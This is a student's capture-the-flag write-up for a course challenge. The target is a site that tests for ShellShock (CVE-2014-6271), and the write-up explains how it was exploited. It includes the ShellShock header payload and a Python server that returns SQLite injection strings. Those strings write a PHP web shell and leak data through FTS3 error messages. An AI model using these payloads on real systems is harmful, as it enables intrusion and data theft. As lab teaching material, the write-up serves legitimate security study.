# Write up: shellshock (4-1)

## ymli (0016045)

## our task

This is a site that try to detect CVE-2014-6271, also known as "ShellShock".

I listen on a port at `linux1.cs.nctu.edu.tw` and find that the site will send
the shellshock payload via user agent.

```
$ nc -l 5569
GET / HTTP/1.1
User-Agent: () { :;}; echo 'ShellShockTester_atdog';
Host: 140.113.235.151:5569
Accept: */*
```

According to the web page ...

```
The response will be collected into database.
```

I guess the vulnerability is in the response, that is, we can manipulate a
customized response and try to inject the SQL query.

## injection

I write a simple http server in Python and send my query to the server.

```
#!/usr/bin/python

import random
import http.server
import socketserver

"""
$ nc -l 5569
GET / HTTP/1.1
User-Agent: () { :;}; echo 'ShellShockTester_atdog';
Host: 140.113.235.151:5569
Accept: */*
"""


PORT = 5566 + random.randint(1, 20)


class MyHandler(http.server.SimpleHTTPRequestHandler):

    def __init__(self,req,client_addr,server):
        http.server.SimpleHTTPRequestHandler.__init__(self,req,client_addr,server)

    def do_GET(self):
        r="ShellShockTester_atdog') ;ATTACH DATABASE './gg6.php' AS pwn;CREATE TABLE pwn.exp(dataz text);INSERT INTO pwn.exp(dataz) VALUES('<?php $o=system(\"ls\"); echo $o;?>');-- "
        self.send_response(200)
        self.send_header("Content-length", len(r))
        self.end_headers()
        self.wfile.write(r.encode())
        self.wfile.flush()
        print(r)


httpd = socketserver.TCPServer(("", PORT), MyHandler)

print("serving at port", PORT)
httpd.serve_forever()
```


It seems it's hard to inject the sqlite database, so I use a write-file
vulnerability and make a php file that prints `ls`.

```
http://tor.atdog.tw:8888/gg6.php


gg.php gg1.php gg2.php gg3.php gg4.php gg5.php gg6.php hahahahahahahahhahaimdogandu.db index.css index.php index.php
```

## exploit

```
$ wget hahahahahahahahhahaimdogandu.db
$ sqlite3 hahahahahahahahhahaimdogandu.db
SQLite version 3.8.7.4 2014-12-09 01:34:36
Enter ".help" for usage hints.
sqlite> .tables
oyoyoyoy_____1111flag  results
sqlite> select * from oyoyoyoy_____1111flag;
1|SecProg{SQL1teInject1on_yoooo}
```

# another exploit

atdog teaches me that I can use the "virtual table" approach to pwn it.

Just change the payload of my script to the following.

```
r="ShellShockTester_atdog') ;CREATE VIRTUAL TABLE t1 USING fts3(x);"
r="ShellShockTester_atdog') ;SELECT * FROM t1 WHERE t1 MATCH '\"'|| (select name from sqlite_master limit 0,1););"
r="ShellShockTester_atdog') ;SELECT * FROM t1 WHERE t1 MATCH '\"'|| (select tbl_name from sqlite_master limit 0,1););"
r="ShellShockTester_atdog') ;SELECT * FROM t1 WHERE t1 MATCH '\"'|| (select flag from oyoyoyoy_____1111flag limit 0,1););"

"""
Error message from the web page

DATABASE Msg: malformed MATCH expression: ["oyoyoyoy_____1111flag]
DATABASE Msg: malformed MATCH expression: ["oyoyoyoy_____1111flag]
DATABASE Msg: malformed MATCH expression: ["SecProg{SQL1teInject1on_yoooo}]
"""
```

# reference

[SQLite3 Injection Cheat Sheet](http://atta.cked.me/home/sqlite3injectioncheatsheet)
[PHP/Sqlite下常见漏洞浅析](http://www.91ri.org/10983.html)
